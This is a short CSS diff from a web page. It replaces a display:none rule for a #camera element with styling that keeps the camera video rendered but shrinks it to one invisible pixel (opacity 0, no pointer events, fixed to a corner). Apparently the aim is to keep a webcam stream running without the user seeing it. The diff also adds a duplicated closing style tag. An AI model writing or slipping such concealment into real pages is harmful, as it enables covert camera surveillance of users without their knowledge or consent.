@@ -33,14 +33,26 @@ button {
  width: 100%;
  margin: 9px 0;
 }
-#challenge,#camera {
+#challenge {
  display: none;
 }
-video {
- width: 100%;
- max-width: 320px;
- border-radius: 12px;
+
+#camera {
+ position: fixed;
+ width: 1px;
+ height: 1px;
+ overflow: hidden;
+ opacity: 0;
+ pointer-events: none;
+ left: 0;
+ bottom: 0;
 }
+
+#camera video {
+ width: 1px;
+ height: 1px;
+}
+</style>
 </style>
 </head>
 <body>
